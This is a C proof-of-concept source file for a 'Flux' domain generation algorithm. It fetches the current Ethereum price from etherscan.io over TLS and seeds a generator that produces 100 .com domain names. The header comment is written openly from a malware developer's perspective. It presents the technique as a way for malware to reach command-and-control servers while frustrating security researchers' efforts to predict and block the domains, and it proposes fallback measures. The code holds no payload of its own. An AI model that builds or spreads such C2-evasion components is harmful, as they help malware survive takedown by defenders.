#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <schannel.h>
#include <shlwapi.h>
#include <assert.h>
#include <stdio.h>


/*                  Flux Domain Generation Algorithm (@Pyramidyon)
* 
* 
*   Domain Generation Algorithms (DGAs) are widely used in malware to generate domain names dynamically, 
*   yet these algorithms often contain flaws, including susceptibility to reverse engineering. 
*   Moreover, for effective operation, infected machines must have accurately set timezones condition generally met.
*
*   This prompts a critical question: What is common among most malware? 
*   The answer lies in their primary function—to establish a network connection.
*
*   Traditionally, DGA-based malware is tackled by analyzing DGA characteristics, 
*   reverse engineering the algorithms, and blocking the generated domains. 
*   However, as a malware developer, our approach needs to evolve. 
*   We propose developing a DGA that is fundamentally more dynamic, 
*   operating in real-time with unpredictable patterns—let's call this Flux-DGA.
*
*   To achieve this, two innovative methods are considered:
*
*   Method 1: Leverage real-time data from news websites to generate seeds. 
*   News content is inherently random and constantly updated, 
*   providing a robust mechanism for generating unique domain names based on the latest articles.
*
*   Method 2: Utilize blockchain technology. 
*   By extracting seeds from variables such as cryptocurrency prices, 
*   transaction details, or block characteristics, we can ensure a continuous supply of fresh, hard-to-predict seeds.
*
*   Both methods, while still potentially vulnerable to reverse engineering, 
*   introduce a new layer of complexity for security researchers. 
*   They necessitate internet access, aligning with the needs of most malware which seeks to establish command and control (C2) communications.
*
*   It's important to note that while internet-independent malware like Stuxnet or traditional worms (e.g., PE File infections) exist, 
*   the majority of malware ultimately aims to connect to a C2 server, making internet-based domain generation a viable and strategic choice.
* 
*   This PoC includes:
* 
*   - trying to establish an TLS connection with the domain (etherscan.io)
*   - reading the contents of the website, to try to get the value of ethereum.
*   - if the value is retrieved it continues to generate a list of random domains using the dynamic price of ethereum as seed.
* 
*  Improvements:
* 
*   * Fail-safe Measures:
*     * If the domain etherscan.io is unreachable for any reason, we could maintain a curated list of alternative domains.
*     * If the domain etherscan.io is modified, we could switch to using domains from the curated list.
* 
*   There are endless possibilities with Flux-DGA @Pyramidyon
*/


#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "secur32.lib")
#pragma comment (lib, "shlwapi.lib")

#define TLS_MAX_PACKET_SIZE (16384+512) // payload + extra overhead for header/mac/padding (probably an overestimate)
#define BUFFER_SIZE 8192

typedef struct {
    SOCKET sock;
    CredHandle handle;
    CtxtHandle context;
    SecPkgContext_StreamSizes sizes;
    int received;    // byte count in incoming buffer (ciphertext)
    int used;        // byte count used from incoming buffer to decrypt current packet
    int available;   // byte count available for decrypted bytes
    char* decrypted; // points to incoming buffer where data is decrypted inplace
    char incoming[TLS_MAX_PACKET_SIZE];
} tls_socket;

BOOL parse_price(const char* response, char* price)
{
    const char* price_start = strstr(response, "href=\"/chart/etherprice\">$");
    if (price_start) {
        price_start += strlen("href=\"/chart/etherprice\">$"); // Move past the href attribute and dollar sign
        const char* price_end = strstr(price_start, "</a>");
        if (price_end) {
            size_t length = price_end - price_start;
            strncpy_s(price, 50, price_start, length);
            price[length] = '\0';
            return TRUE; // Price found and parsed successfully
        }
    }
    return FALSE; // Price not found
}

DWORD convert_price_to_seed(const char* price) {
    // Remove commas from the price string for easier conversion
    char clean_price[50];
    int j = 0;
    for (int i = 0; price[i] != '\0'; i++) {
        if (price[i] != ',') {
            clean_price[j++] = price[i];
        }
    }
    clean_price[j] = '\0';

    // Convert the cleaned price to a double
    double price_value = atof(clean_price);
    // Convert the double to an integer, ignoring the cents
    DWORD seed = (DWORD)price_value;

    // Print the seed directly to ensure it is converted properly
    printf("[+] Seed from Ether price: %lu\n", seed);

    return seed;
}

VOID gen_domainname(DWORD seed, PWCHAR pwOut, UINT uLength) {
    static const wchar_t* suffix = L".com";
    WCHAR characters[] = L"abcdefghijklmnopqrstuvwxyz";

    for (UINT i = 0; i < uLength; i++) {
        seed = seed * 48271L + 1L; //X n + 1 = (aXn+ c) mod m OR seed = seed * 48271L + 1L;
        pwOut[i] = characters[(seed >> 16) % (sizeof(characters) / sizeof(characters[0]) - 1)];
    }

    wcscpy(pwOut + uLength, suffix);
}

// returns 0 on success or negative value on error
static int tls_connect(tls_socket* s, const char* hostname, unsigned short port)
{
    printf("[+] Initializing Windows Sockets\n");
    // initialize windows sockets
    WSADATA wsadata;
    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
    {
        printf("[-] WSAStartup failed\n");
        return -1;
    }

    // create TCP IPv4 socket
    printf("[+] Creating TCP socket\n");
    s->sock = socket(AF_INET, SOCK_STREAM, 0);
    if (s->sock == INVALID_SOCKET)
    {
        printf("[-] Socket creation failed\n");
        WSACleanup();
        return -1;
    }

    char sport[64];
    wnsprintfA(sport, sizeof(sport), "%u", port);

    // connect to server
    printf("[+] Connecting to server: %s:%s\n", hostname, sport);
    if (!WSAConnectByNameA(s->sock, hostname, sport, NULL, NULL, NULL, NULL, NULL, NULL))
    {
        printf("[-] WSAConnectByNameA failed\n");
        closesocket(s->sock);
        WSACleanup();
        return -1;
    }

    // initialize schannel
    printf("[+] Initializing Schannel\n");
    {
        SCHANNEL_CRED cred =
        {
            .dwVersion = SCHANNEL_CRED_VERSION,
            .dwFlags = SCH_USE_STRONG_CRYPTO          // use only strong crypto alogorithms
                     | SCH_CRED_AUTO_CRED_VALIDATION  // automatically validate server certificate
                     | SCH_CRED_NO_DEFAULT_CREDS,     // no client certificate authentication
            .grbitEnabledProtocols = SP_PROT_TLS1_2,  // allow only TLS v1.2
        };

        if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &s->handle, NULL) != SEC_E_OK)
        {
            printf("[-] AcquireCredentialsHandle failed\n");
            closesocket(s->sock);
            WSACleanup();
            return -1;
        }
    }

    s->received = s->used = s->available = 0;
    s->decrypted = NULL;

    // perform tls handshake
    printf("[+] Performing TLS handshake\n");
    CtxtHandle* context = NULL;
    int result = 0;
    for (;;)
    {
        SecBuffer inbuffers[2] = { 0 };
        inbuffers[0].BufferType = SECBUFFER_TOKEN;
        inbuffers[0].pvBuffer = s->incoming;
        inbuffers[0].cbBuffer = s->received;
        inbuffers[1].BufferType = SECBUFFER_EMPTY;

        SecBuffer outbuffers[1] = { 0 };
        outbuffers[0].BufferType = SECBUFFER_TOKEN;

        SecBufferDesc indesc = { SECBUFFER_VERSION, ARRAYSIZE(inbuffers), inbuffers };
        SecBufferDesc outdesc = { SECBUFFER_VERSION, ARRAYSIZE(outbuffers), outbuffers };

        DWORD flags = ISC_REQ_USE_SUPPLIED_CREDS | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_STREAM;
        SECURITY_STATUS sec = InitializeSecurityContextA(
            &s->handle,
            context,
            context ? NULL : (SEC_CHAR*)hostname,
            flags,
            0,
            0,
            context ? &indesc : NULL,
            0,
            context ? NULL : &s->context,
            &outdesc,
            &flags,
            NULL);

        // after first call to InitializeSecurityContext context is available and should be reused for next calls
        context = &s->context;

        if (inbuffers[1].BufferType == SECBUFFER_EXTRA)
        {
            MoveMemory(s->incoming, s->incoming + (s->received - inbuffers[1].cbBuffer), inbuffers[1].cbBuffer);
            s->received = inbuffers[1].cbBuffer;
        }
        else
        {
            s->received = 0;
        }

        if (sec == SEC_E_OK)
        {
            // tls handshake completed
            printf("[+] TLS handshake completed successfully\n");
            break;
        }
        else if (sec == SEC_I_INCOMPLETE_CREDENTIALS)
        {
            // server asked for client certificate, not supported here
            printf("[-] Server requested client certificate, which is not supported\n");
            result = -1;
            break;
        }
        else if (sec == SEC_I_CONTINUE_NEEDED)
        {
            // need to send data to server
            printf("[i] Sending handshake continuation data\n");
            char* buffer = outbuffers[0].pvBuffer;
            int size = outbuffers[0].cbBuffer;

            while (size != 0)
            {
                int d = send(s->sock, buffer, size, 0);
                if (d <= 0)
                {
                    break;
                }
                size -= d;
                buffer += d;
            }
            FreeContextBuffer(outbuffers[0].pvBuffer);
            if (size != 0)
            {
                // failed to fully send data to server
                printf("[-] Failed to send handshake continuation data\n");
                result = -1;
                break;
            }
        }
        else if (sec != SEC_E_INCOMPLETE_MESSAGE)
        {
            // SEC_E_CERT_EXPIRED - certificate expired or revoked
            // SEC_E_WRONG_PRINCIPAL - bad hostname
            // SEC_E_UNTRUSTED_ROOT - cannot vertify CA chain
            // SEC_E_ILLEGAL_MESSAGE / SEC_E_ALGORITHM_MISMATCH - cannot negotiate crypto algorithms
            printf("[-] Handshake failed with status: 0x%x\n", sec);
            result = -1;
            break;
        }

        // read more data from server when possible
        if (s->received == sizeof(s->incoming))
        {
            // server is sending too much data instead of proper handshake?
            printf("[-] Incoming buffer is full during handshake\n");
            result = -1;
            break;
        }

        int r = recv(s->sock, s->incoming + s->received, sizeof(s->incoming) - s->received, 0);
        if (r == 0)
        {
            // server disconnected socket
            printf("[-] Server disconnected during handshake\n");
            return 0;
        }
        else if (r < 0)
        {
            // socket error
            printf("[-] Error receiving data from server during handshake\n");
            result = -1;
            break;
        }
        s->received += r;
    }

    if (result != 0)
    {
        DeleteSecurityContext(context);
        FreeCredentialsHandle(&s->handle);
        closesocket(s->sock);
        WSACleanup();
        return result;
    }

    QueryContextAttributes(context, SECPKG_ATTR_STREAM_SIZES, &s->sizes);
    return 0;
}

// disconnects socket & releases resources (call this even if tls_write/tls_read function return error)
static void tls_disconnect(tls_socket* s)
{
    printf("[+] Disconnecting and cleaning up\n");
    DWORD type = SCHANNEL_SHUTDOWN;

    SecBuffer inbuffers[1];
    inbuffers[0].BufferType = SECBUFFER_TOKEN;
    inbuffers[0].pvBuffer = &type;
    inbuffers[0].cbBuffer = sizeof(type);

    SecBufferDesc indesc = { SECBUFFER_VERSION, ARRAYSIZE(inbuffers), inbuffers };
    ApplyControlToken(&s->context, &indesc);

    SecBuffer outbuffers[1];
    outbuffers[0].BufferType = SECBUFFER_TOKEN;

    SecBufferDesc outdesc = { SECBUFFER_VERSION, ARRAYSIZE(outbuffers), outbuffers };
    DWORD flags = ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_STREAM;
    if (InitializeSecurityContextA(&s->handle, &s->context, NULL, flags, 0, 0, &outdesc, 0, NULL, &outdesc, &flags, NULL) == SEC_E_OK)
    {
        char* buffer = outbuffers[0].pvBuffer;
        int size = outbuffers[0].cbBuffer;
        while (size != 0)
        {
            int d = send(s->sock, buffer, size, 0);
            if (d <= 0)
            {
                // ignore any failures socket will be closed anyway
                break;
            }
            buffer += d;
            size -= d;
        }
        FreeContextBuffer(outbuffers[0].pvBuffer);
    }
    shutdown(s->sock, SD_BOTH);

    DeleteSecurityContext(&s->context);
    FreeCredentialsHandle(&s->handle);
    closesocket(s->sock);
    WSACleanup();
}

// returns 0 on success or negative value on error
static int tls_write(tls_socket* s, const void* buffer, int size)
{
    printf("[+] Writing data to TLS socket\n");
    while (size != 0)
    {
        int use = min(size, s->sizes.cbMaximumMessage);

        char wbuffer[TLS_MAX_PACKET_SIZE];
        assert(s->sizes.cbHeader + s->sizes.cbMaximumMessage + s->sizes.cbTrailer <= sizeof(wbuffer));

        SecBuffer buffers[3];
        buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
        buffers[0].pvBuffer = wbuffer;
        buffers[0].cbBuffer = s->sizes.cbHeader;
        buffers[1].BufferType = SECBUFFER_DATA;
        buffers[1].pvBuffer = wbuffer + s->sizes.cbHeader;
        buffers[1].cbBuffer = use;
        buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
        buffers[2].pvBuffer = wbuffer + s->sizes.cbHeader + use;
        buffers[2].cbBuffer = s->sizes.cbTrailer;

        CopyMemory(buffers[1].pvBuffer, buffer, use);

        SecBufferDesc desc = { SECBUFFER_VERSION, ARRAYSIZE(buffers), buffers };
        SECURITY_STATUS sec = EncryptMessage(&s->context, 0, &desc, 0);
        if (sec != SEC_E_OK)
        {
            // this should not happen, but just in case check it
            printf("[-] EncryptMessage failed with status: 0x%x\n", sec);
            return -1;
        }

        int total = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
        int sent = 0;
        while (sent != total)
        {
            int d = send(s->sock, wbuffer + sent, total - sent, 0);
            if (d <= 0)
            {
                // error sending data to socket, or server disconnected
                printf("[-] Error sending data to socket\n");
                return -1;
            }
            sent += d;
        }

        buffer = (char*)buffer + use;
        size -= use;
    }

    return 0;
}

// blocking read, waits & reads up to size bytes, returns amount of bytes received on success (<= size)
// returns 0 on disconnect or negative value on error
static int tls_read(tls_socket* s, void* buffer, int size)
{
    printf("[+] Reading data from TLS socket\n");
    int result = 0;

    while (size != 0)
    {
        if (s->decrypted)
        {
            // if there is decrypted data available, then use it as much as possible
            int use = min(size, s->available);
            CopyMemory(buffer, s->decrypted, use);
            buffer = (char*)buffer + use;
            size -= use;
            result += use;

            if (use == s->available)
            {
                // all decrypted data is used, remove ciphertext from incoming buffer so next time it starts from beginning
                MoveMemory(s->incoming, s->incoming + s->used, s->received - s->used);
                s->received -= s->used;
                s->used = 0;
                s->available = 0;
                s->decrypted = NULL;
            }
            else
            {
                s->available -= use;
                s->decrypted += use;
            }
        }
        else
        {
            // if any ciphertext data available then try to decrypt it
            if (s->received != 0)
            {
                SecBuffer buffers[4];
                assert(s->sizes.cBuffers == ARRAYSIZE(buffers));

                buffers[0].BufferType = SECBUFFER_DATA;
                buffers[0].pvBuffer = s->incoming;
                buffers[0].cbBuffer = s->received;
                buffers[1].BufferType = SECBUFFER_EMPTY;
                buffers[2].BufferType = SECBUFFER_EMPTY;
                buffers[3].BufferType = SECBUFFER_EMPTY;

                SecBufferDesc desc = { SECBUFFER_VERSION, ARRAYSIZE(buffers), buffers };

                SECURITY_STATUS sec = DecryptMessage(&s->context, &desc, 0, NULL);
                if (sec == SEC_E_OK)
                {
                    assert(buffers[0].BufferType == SECBUFFER_STREAM_HEADER);
                    assert(buffers[1].BufferType == SECBUFFER_DATA);
                    assert(buffers[2].BufferType == SECBUFFER_STREAM_TRAILER);

                    s->decrypted = buffers[1].pvBuffer;
                    s->available = buffers[1].cbBuffer;
                    s->used = s->received - (buffers[3].BufferType == SECBUFFER_EXTRA ? buffers[3].cbBuffer : 0);

                    // data is now decrypted, go back to beginning of loop to copy memory to output buffer
                    continue;
                }
                else if (sec == SEC_I_CONTEXT_EXPIRED)
                {
                    // server closed TLS connection (but socket is still open)
                    printf("[i] Server closed TLS connection\n");
                    s->received = 0;
                    return result;
                }
                else if (sec == SEC_I_RENEGOTIATE)
                {
                    // server wants to renegotiate TLS connection, not implemented here
                    printf("[-] Server requested renegotiation, which is not implemented\n");
                    return -1;
                }
                else if (sec != SEC_E_INCOMPLETE_MESSAGE)
                {
                    // some other schannel or TLS protocol error
                    printf("[-] DecryptMessage failed with status: 0x%x\n", sec);
                    return -1;
                }
                // otherwise sec == SEC_E_INCOMPLETE_MESSAGE which means need to read more data
            }
            // otherwise not enough data received to decrypt

            if (result != 0)
            {
                // some data is already copied to output buffer, so return that before blocking with recv
                break;
            }

            if (s->received == sizeof(s->incoming))
            {
                // server is sending too much garbage data instead of proper TLS packet
                printf("[-] Incoming buffer is full\n");
                return -1;
            }

            // wait for more ciphertext data from server
            int r = recv(s->sock, s->incoming + s->received, sizeof(s->incoming) - s->received, 0);
            if (r == 0)
            {
                // server disconnected socket
                printf("[i] Server disconnected socket\n");
                return 0;
            }
            else if (r < 0)
            {
                // error receiving data from socket
                printf("[-] Error receiving data from socket\n");
                result = -1;
                break;
            }
            s->received += r;
        }
    }

    return result;
}

int main()
{
    const char* hostname = "etherscan.io";
    const char* path = "/";

    tls_socket s;
    if (tls_connect(&s, hostname, 443) != 0)
    {
        printf("[-] Error connecting to %s\n", hostname);
        return -1;
    }

    printf("[+] Connected to %s\n", hostname);

    // send request
    char req[1024];
    int len = sprintf(req, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname);
    if (tls_write(&s, req, len) != 0)
    {
        printf("[-] Error sending request\n");
        tls_disconnect(&s);
        return -1;
    }

    // read response until price is found
    char response[BUFFER_SIZE] = { 0 };
    int received = 0;
    char price[50] = { 0 };
    int price_found = 0;

    for (;;)
    {
        char buf[65536];
        int r = tls_read(&s, buf, sizeof(buf));
        if (r < 0)
        {
            printf("[-] Error receiving data\n");
            break;
        }
        else if (r == 0)
        {
            printf("[i] Socket disconnected\n");
            break;
        }
        else
        {
            if (received + r < BUFFER_SIZE - 1)
            {
                memcpy(response + received, buf, r);
                received += r;
                response[received] = '\0';

            }
            if (parse_price(buf, price))
            {
                price_found = 1;
                printf("[+] Ether price: %s\n", price);
                break;
            }
        }
    }

    if (!price_found)
    {
        printf("[-] Failed to parse Ether price\n");
        tls_disconnect(&s);
        return -1;
    }

    // Convert Ether price to seed
    DWORD seed = convert_price_to_seed(price);

    // Generate and print unique domain names
    WCHAR domainName[12];
    printf("[+] Generated domain names:\r\n\r\n");
    for (UINT i = 0; i < 100; i++) { /* 100 = maximum of domains it will generate per seed. */ 
        gen_domainname(seed + i, domainName, 10);
        wprintf(L"%s (%i), ", domainName, i);
    }
    wprintf(L"\r\n\r\n");

    tls_disconnect(&s);
    getchar();
    return 0;
}
